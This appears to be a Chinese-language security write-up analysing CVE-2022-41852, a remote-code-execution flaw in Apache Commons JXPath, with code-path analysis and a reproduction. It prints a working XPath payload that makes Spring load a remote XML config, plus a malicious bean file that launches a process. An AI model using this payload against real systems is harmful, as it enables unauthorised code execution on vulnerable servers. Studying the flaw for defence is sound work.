## **项目介绍**

Apache Commons JXPath是美国阿帕奇（Apache）基金会的一种 XPath 1.0 的基于 Java 的实现。JXPath 为使用
XPath 语法遍历 JavaBeans、DOM 和其他类型的对象的图形提供了 API。

##  **漏洞描述**

Apache Commons JXPath
存在安全漏洞，攻击者可以利用除compile()和compilePath()函数之外的所有处理XPath字符串的JXPathContext类函数通过XPath表达式从类路径加载任何Java类，从而执行恶意代码。

![](https://image.3001.net/images/20221019/1666160157_634f961dc7e50ccce3fba.png!small)

##  **利用范围**

Apache Commons JXpath <= 1.3

##  **漏洞分析**

###  **环境搭建**

使用github上POC进行分析复现https://github.com/Warxim/CVE-2022-41852

![](https://image.3001.net/images/20221019/1666160284_634f969ceb54889ffb168.png!small)

漏洞POC使用Spring框架，简单实现接受用户输入并使用它从Person类中检索指定的数据。

###  **前置知识**

在漏洞分析之前，首先了解一下JXPath及用法（参考官网用户指南：https://commons.apache.org/proper/commons-jxpath/users-guide.html）

![](https://image.3001.net/images/20221019/1666160387_634f970376d74a8572d44.png!small)

JXPath除了能够像XPatth一样能够访问XML文档各种元素之外，还能够读取和写入JavaBean的属性，获取和设置数组、集合、映射、透明容器、Servlet
中的各种上下文对象等元素。

JXPath 支持开箱即用的标准 XPath 函数。它还支持“标准”扩展函数（基本上是通往 Java 的桥梁），以及完全自定义的扩展函数。

![](https://image.3001.net/images/20221019/1666160411_634f971bce828847bebe6.png!small)

###  **代码分析**

JXPath支持自定义扩展函数，首先看一下PackageFunctions这个类

![](https://image.3001.net/images/20221019/1666160473_634f9759a6190790cb809.png!small)在org.apache.commons.jxpath.PackageFunctions#getFunction中，存在methodName.equals("new"）

![](https://image.3001.net/images/20221019/1666160496_634f97706c2fdb41ddf2f.png!small)

这里实例化的xpath表达式设置为了xxx.new()，截取括号前作为方法名，如果调用new方法就被视为实例化，两个判断一个是实例化构造函数，另一个是静态方法。

往下分析，如果是实例化构造函数，在Spring框架中可通过加载远程配置实现命令执行，这里使用org.springframework.context.support.ClassPathXmlApplicationContext类，构造payload：

org.springframework.context.support.ClassPathXmlApplicationContext.new("http://127.0.0.1:8001/test.xml")

恶意的xml文件使用Spring-bean，设置init-method实现RCE

    
    
    "http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
                <list>
                    <value>cmd</value>
                    <value>/c</value>
                    <value><![CDATA[calc]]></value>
                </list>
            </constructor-arg>
        </bean>
    </beans>

在实例化之后，继续跟进会来到org.apache.commons.jxpath.ri.compiler.ExtensionFunction#computeValue

![](https://image.3001.net/images/20221019/1666160744_634f9868d7cf57fe5bc3f.png!small)在获得了org.apache.commons.jxpath.Function对应的这个实例后，会调⽤具体的invoke实现。

![](https://image.3001.net/images/20221019/1666160763_634f987bbb80cd5980cff.png!small)![](https://image.3001.net/images/20221019/1666160776_634f98889238e6fd619b4.png!small)最后在调用invoke实现Spring-bean加载，执行恶意代码。

![](https://image.3001.net/images/20221019/1666160798_634f989e71f523aec4b7c.png!small)

Spring框架中还可以用org.apache.commons.jxpath.functions.MethodFunction这个类。

除了实例化构造函数，Spring框架加载恶意配置的利用之外。还能利用静态方法进行RCE，例如jndi、jdbc等，后续笔者也会进行补充和分析。

当然在官方介绍中说明，除了构造函数和使用静态方法，还介绍了一种调用。

![](https://image.3001.net/images/20221019/1666160827_634f98bbaf35e287ad36f.png!small)

此调用也可以直接利用getValue解析表达式。

###  **漏洞复现**

在Spring中利用远程加载配置来命令执行。

构造test.xml

![](https://image.3001.net/images/20221019/1666160868_634f98e41c748324e2c46.png!small)本地用python开启http服务，模拟远程加载。

![](https://image.3001.net/images/20221019/1666161086_634f99be60ff3e816bf0d.png!small)成功命令执行。

![](https://image.3001.net/images/20221019/1666161105_634f99d1e9ea1fe09440b.png!small)

##  **修复建议**

目前官方已经停止更新，暂时没有修复版本。

##  **参考材料**

1.https://github.com/Warxim/CVE-2022-41852

2.https://commons.apache.org/proper/commons-jxpath/users-guide.html

3.https://github.com/advisories/GHSA-wrx5-rp7m-mm49

